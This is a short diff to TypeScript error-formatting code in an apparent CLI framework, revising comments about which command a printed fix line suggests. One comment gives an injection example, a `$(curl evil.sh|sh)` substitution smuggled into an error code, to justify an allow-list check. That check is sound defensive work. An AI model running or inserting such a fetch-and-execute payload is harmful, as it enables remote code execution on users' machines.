@@ -86,9 +86,8 @@ export const factsOf = (error: unknown): ErrorFacts => {
     code,
     title,
     cause,
-    // `x logs tail` is in `PLANNED_COMMANDS` — it exits `X_NOT_IMPLEMENTED`. A fix line naming a
-    // command that throws is axiom 4 inverted: the one instruction the reader is given fails.
-    // `x errors explain` ships, and it is the command that answers "what is this code".
+    // `x errors explain`, never `x logs tail`: the log tail reads a dev process's file, and a fix
+    // line has to answer "what is this code" wherever the reader is — the one command that does.
     // `FRAMEWORK_CODE`, never `startsWith('X_')`: `code` is a string field off a value this
     // package did not build, and this line is a COMMAND a reader pastes — `x errors explain
     // X_$(curl evil.sh|sh) --json` substitutes before `x` is reached. A code that is not one
